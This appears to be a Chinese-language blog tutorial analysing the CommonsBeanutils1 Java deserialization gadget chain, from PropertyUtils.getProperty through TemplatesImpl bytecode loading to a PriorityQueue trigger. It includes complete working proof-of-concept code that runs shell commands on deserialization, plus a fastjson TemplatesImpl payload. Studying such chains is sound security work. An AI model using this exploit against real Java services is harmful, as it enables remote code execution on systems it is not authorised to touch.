---
title: Java反序列化利用链之CommonsBeanutils1
date: 2024-03-03 18:53:00 +0800
img_path: /
categories: [Java安全, Java反序列化]
tags: [Java安全, Java反序列化]     

---

# CommonsBeanutils1

我们可以找到这么一个类`org.apache.commons.beanutils.BeanComparator` ，他的`compare`方法如下：

```java
 public int compare(T o1, T o2) {
        if (this.property == null) {
            return this.internalCompare(o1, o2);
        } else {
            try {
                Object value1 = PropertyUtils.getProperty(o1, this.property);
                Object value2 = PropertyUtils.getProperty(o2, this.property);
                return this.internalCompare(value1, value2);
            } catch (IllegalAccessException var5) {
                throw new RuntimeException("IllegalAccessException: " + var5.toString());
            } catch (InvocationTargetException var6) {
                throw new RuntimeException("InvocationTargetException: " + var6.toString());
            } catch (NoSuchMethodException var7) {
                throw new RuntimeException("NoSuchMethodException: " + var7.toString());
            }
        }
    }

```

该方法中，如果`this.property`为空的情况下会直接比较这俩对象。如果不为空的情况，则是调用`PropertyUtils.getProperty()`来获取俩对象`property`的值，然后进行比较。

## getProperty方法

关于`PropertyUtils.getProperty()`是做什么的可看以下例子：

```java
import org.apache.commons.beanutils.PropertyUtils;
import java.lang.reflect.InvocationTargetException;

public class Demo {
    private String name;
    private int age;
	//读写方法以`get`和`set`开头，后面是首字母大写的属性名，
    //他们包含若干个私有的属性，要得到这个属性只能通过`getXxxx`来获取。
    public String getName() {
        return this.name;
    }

    public void setName(String name) {
        this.name = name;
    }

    public int getAge() {
        return this.age;
    }

    public void setAge(int age) {
        this.age = age;
    }

    public static void main(String[] args) throws InvocationTargetException, IllegalAccessException, NoSuchMethodException {
        Demo demo = new Demo();
        demo.setName("P0l@r19ht");
        Object p = PropertyUtils.getProperty(demo, "name");
        System.out.println("name：" + p);
    }
}
//运行结果：
//name：P0l@r19ht
```

根据上方例子我们知道`commons beanutils `中的类`PropertyUtils`，他提供了一个静态方法`getProperty()`,该方法可以让使用者直接调用某个`JavaBean`的某个属性的`getter`，比如上面那个，我要调用他的`getName`，我们只需要上方例子这样写即可:

```java
        Demo demo = new Demo();
        demo.setName("P0l@r19ht");
        Object p = PropertyUtils.getProperty(demo, "name");
```

这时候他就会去自动寻找到`Demo`类的`name`属性的`getter`，就是上面的`getName()`，调用并且获取返回值。

此外，他还支持递归获取属性，比如`a`对象中有属性`b`，`b`对象中有属性`c`，可以通过如下方式进行递归获取：

```java
PropertyUtils.getProperty(a,"b.c");
```

通过这种方式可以很方便的获取不同类的不同属性的值。

调试可看出：

```java
PropertyUtils#getProperty()-->PropertyUtilsBean#getProperty()
    -->PropertyUtilsBean#getNestedProperty()-->PropertyUtilsBean#getSimpleProperty()
```

### PropertyUtils#getProperty()

![image-20240229185210616](assets/image-20240229185210616.png)

### PropertyUtilsBean#getProperty()

![image-20240229185528950](assets/image-20240229185528950.png)

### PropertyUtilsBean#getNestedProperty()

![image-20240229185013066](assets/image-20240229185013066.png)

在`PropertyUtilsBean#getNestedProperty()`中会先通过`while循环`获取嵌套属性，就如上方介绍的通过 `PropertyUtils.getProperty(a, "b.c")` 的方式进行递归获取。我们的测试代码中传入的属性不是嵌套的，故而进入到`getSimpleProperty()`：

![image-20240229185759414](assets/image-20240229185759414.png)

### PropertyUtilsBean#getSimpleProperty()

![image-20240229190931518](assets/image-20240229190931518.png)

由于此处`bean`不为`DynaBean`，故而通过`getPropertyDescriptor()`方法获取属性描述：

> `DynaBean` 是 Apache Commons BeanUtils 库中的一个接口，用于表示动态 Bean（动态 JavaBean）。它允许在运行时动态添加、删除和修改属性，而不需要在编译时定义相应的 Java 类。
>
> `DynaBean` 接口提供了一种更灵活的方式来操作属性，而不受静态类型的限制。这对于需要在运行时动态处理属性的场景非常有用，例如在处理用户定义的数据结构或配置文件时。

此处获取到`name`的读写方法名，最后获取到读方法`getter`的方法对象，通过**反射调用**并返回值：

![image-20240229191801977](assets/image-20240229191801977.png)

简而言之，`PropertyUtils.getProperty(）`这个方法就是通过**反射**调用**任意对象**的`getter`，获得对应属性的值，此处的属性可以是嵌套的。

## getter的妙用

### TemplatesImpl

利用`Templates`加载任意字节码的调用链：

```java
TemplatesImpl.getOutputProperties()-->TemplatesImpl#newTransformer()
    -->TemplatesImpl#getTransletInstance()-->TemplatesImpl#defineTransletClasses()
    -->TemplatesImpl.TransletClassLoader#defineClass()
```

```java
package org.example.cb1;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.*;

import java.lang.reflect.Field;

public class TemplatesImplDemo {
    public static void main(String[] args) throws Exception {
        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_bytecodes", new byte[][] {genPayload("calc").toBytecode()});
        setFieldValue(templates, "_name", "HelloTemplatesImpl");
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
        templates.getOutputProperties();
    }
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception{
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj,value);
    }
    public static CtClass genPayload(String cmd) throws NotFoundException, CannotCompileException {
        ClassPool classPool = ClassPool.getDefault();
        CtClass clazz = classPool.makeClass("Exp");

        if ((clazz.getDeclaredConstructors()).length != 0) {
            clazz.removeConstructor(clazz.getDeclaredConstructors()[0]);
        }
        clazz.addConstructor(CtNewConstructor.make("public Exp() throws Exception {\n" +
                "            try {\n" +
                "                    String tc = \"" + cmd + "\";\n" +
                "                    String[] cmd = System.getProperty(\"os.name\").toLowerCase().contains(\"windows\") " +
                "                        ? new String[]{\"cmd.exe\", \"/c\", tc} : new String[]{\"/bin/sh\", \"-c\", tc};" +
                "            new ProcessBuilder(cmd).start();" +
                "            } catch (Exception e) {\n" +
                "                e.getStackTrace();\n" +
                "            }\n" +
                "        }", clazz));

        // 兼容低版本jdk
        clazz.getClassFile().setMajorVersion(50);
        CtClass superClass = classPool.get(AbstractTranslet.class.getName());
        clazz.setSuperclass(superClass);
        return clazz;
    }
}
```

#### getOutputProperties()

此处的`getOutputProperties()`正好符合`getter`的定义且存在`newTransformer()`。

![image-20240229200505640](assets/image-20240229200505640.png)

#### newTransformer()

![image-20240303210817726](assets/image-20240303210817726.png)

#### getTransletInstance()

需要`_name`不为`null`且`_class`为`null`，所以需要设置` _name `为任意字符，`setFieldValue(templates, "_name", "XXX");`从而调用`defineTransletClasses()`

![image-20240303210854286](assets/image-20240303210854286.png)

#### defineTransletClasses()

注意这里`_tfactory.getExternalExtensionsMap()`，也就是为什么将`_tfactory`设置成`new TransformerFactoryImpl()`的原因。

![image-20240303211331038](assets/image-20240303211331038.png)

但我们可以发现在`fastjson`的`payload`中并没有这样设置。

```java
 {"@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl","_bytecodes":["xxxxxxx"],"_name":"a.b","_tfactory":{},"_outputProperties":{ },"_version":"1.0","allowedProtocols":"all"}
```

#### getTransletInstance()

而我们设置的`_bytecodes`在这儿被`defineClass`加载进去，此处最终会调用原生`defineClass`加载字节码，然后赋值给`_class[i]`。而在`getTransletInstance()`执行`defineTransletClasses()`之后由于`_transletIndex = i`，至此我们加载进去的恶意类被实例化。

![image-20240303212411596](assets/image-20240303212411596.png)

调用栈如下：

![image-20240303200934488](assets/image-20240303200934488.png)

总结，只要我们事先用反射设置好`_bytecodes`、`_name`、`_tfactory`这三个属性，再调用`TemplatesImpl.getOutputProperties()`，即可执行任意类。



回到刚才`getProperty()`方法， 如果我们在`PropertyUtils#getProperty(Object bean,String name)`方法中传入`bean`为`TemplatesImpl`对象，`name`为`outputProperties`，这不就可以构成一条`Gadget `的后半段了么？那么我们就要去找，谁可以调用到`PropertyUtils#getProperty()`：

仅找到`commons-beanutils`包中的四个类，其中仅`BeanComparator`实现了`Serializable`接口！！！

### BeanComparator

![image-20240229203311932](assets/image-20240229203311932.png)

回到类`org.apache.commons.beanutils.BeanComparator`的`compare`方法：

```java
 public int compare(T o1, T o2) {
        if (this.property == null) {
            return this.internalCompare(o1, o2);
        } else {
            try {
                Object value1 = PropertyUtils.getProperty(o1, this.property);
                Object value2 = PropertyUtils.getProperty(o2, this.property);
                return this.internalCompare(value1, value2);
            } catch (IllegalAccessException var5) {
                throw new RuntimeException("IllegalAccessException: " + var5.toString());
            } catch (InvocationTargetException var6) {
                throw new RuntimeException("InvocationTargetException: " + var6.toString());
            } catch (NoSuchMethodException var7) {
                throw new RuntimeException("NoSuchMethodException: " + var7.toString());
            }
        }
    }
```

很明显我们只要传入`o1`，`o2`为我们构造的`TemplatesImpl`对象，`property`为`outputProperties`就能触发代码了。

接下来就可以找一个反序列化的入口用来触发`compare()` 👇

## CommonsBeanutils1利用入口

反序列化入口 `PriorityQueue`（优先队列）是基于二叉堆实现，在它反序列化时，为了保证队列顺序，会进行重排序的操作，而排序就涉及到大小比较，进而执行` java.util.Comparator `接口的 `compare() `方法。

![image-20240303184146703](assets/image-20240303184146703.png)

![image-20240303184421524](assets/image-20240303184421524.png)

![image-20240303185853640](assets/image-20240303185853640.png)

那么我们只要构造一个`BeanComparator`传进去，就可以触发代码，弹计算器了，利用`Poc`如下：

```java
package org.example.cb1;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.*;
import org.apache.commons.beanutils.BeanComparator;
import org.example.util.Tools;

import java.lang.reflect.Field;
import java.util.PriorityQueue;

public class CB1Poc {
    public static void setFieldValue(Object obj, String fieldName, Object
            value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static CtClass genPayload(String cmd) throws NotFoundException, CannotCompileException {
        ClassPool classPool = ClassPool.getDefault();
        CtClass clazz = classPool.makeClass("Exp");

        if ((clazz.getDeclaredConstructors()).length != 0) {
            clazz.removeConstructor(clazz.getDeclaredConstructors()[0]);
        }
        clazz.addConstructor(CtNewConstructor.make("public Exp() throws Exception {\n" +
                "            try {\n" +
                "                    String tc = \"" + cmd + "\";\n" +
                "                    String[] cmd = System.getProperty(\"os.name\").toLowerCase().contains(\"windows\") " +
                "                        ? new String[]{\"cmd.exe\", \"/c\", tc} : new String[]{\"/bin/sh\", \"-c\", tc};" +
                "            new ProcessBuilder(cmd).start();" +
                "            } catch (Exception e) {\n" +
                "                e.getStackTrace();\n" +
                "            }\n" +
                "        }", clazz));

        // 兼容低版本jdk
        clazz.getClassFile().setMajorVersion(50);
        CtClass superClass = classPool.get(AbstractTranslet.class.getName());
        clazz.setSuperclass(superClass);
        return clazz;
    }

    public static void main(String[] args) throws Exception {
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][]{genPayload("calc").toBytecode()});
        setFieldValue(obj, "_name", "HelloTemplatesImpl");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
        final BeanComparator comparator = new BeanComparator();
        PriorityQueue queue = new PriorityQueue(2, comparator);

        queue.add(1);
        queue.add(1);
        setFieldValue(comparator, "property", "outputProperties");
        setFieldValue(queue, "queue", new Object[]{obj, obj});
        byte[] se = Tools.serialize(queue);
        Tools.deserialize(se);
    }
}
```

```java
package org.example.util;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.util.Base64;

public class Tools {
    public Tools() {
    }

    public static byte[] base64Decode(String base64) {
        Base64.Decoder decoder = Base64.getDecoder();
        return decoder.decode(base64);
    }

    public static String base64Encode(byte[] bytes) {
        Base64.Encoder encoder = Base64.getEncoder();
        return encoder.encodeToString(bytes);
    }

    public static byte[] serialize(final Object obj) throws Exception {
        ByteArrayOutputStream btout = new ByteArrayOutputStream();
        ObjectOutputStream objOut = new ObjectOutputStream(btout);
        objOut.writeObject(obj);
        return btout.toByteArray();
    }

    public static Object deserialize(final byte[] serialized) throws Exception {
        ByteArrayInputStream btin = new ByteArrayInputStream(serialized);
        ObjectInputStream objIn = new ObjectInputStream(btin);
        return objIn.readObject();
    }
}
```

初始化时使用正经对象，且` property` 为空，这一系列操作是为了初始化的时候不要出错。然后，我们再用反射将`property `的值设置成恶意的 `outputProperties` ，将队列里的两个`1`替换成恶意的`TemplateImpl `对象（这里的话因为后面需要调用`PropertyUtils.getProperty( o1, property)`，这里的`o1`得是我们传进去的恶意`TemplateImpl `对象）

```java
  public static void main(String[] args) throws Exception {
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][]{genPayload("calc").toBytecode()});
        setFieldValue(obj, "_name", "HelloTemplatesImpl");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
      
        final BeanComparator comparator = new BeanComparator();
      
        PriorityQueue queue = new PriorityQueue(2, comparator);
        queue.add(1);
        queue.add(1);
      
        setFieldValue(comparator, "property", "outputProperties");
        setFieldValue(queue, "queue", new Object[]{obj, obj});
    }    
public static void setFieldValue(Object obj, String fieldName, Object
            value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
```

使用`PriorityQueue`的调用栈：

![image-20240303191245598](assets/image-20240303191245598.png)
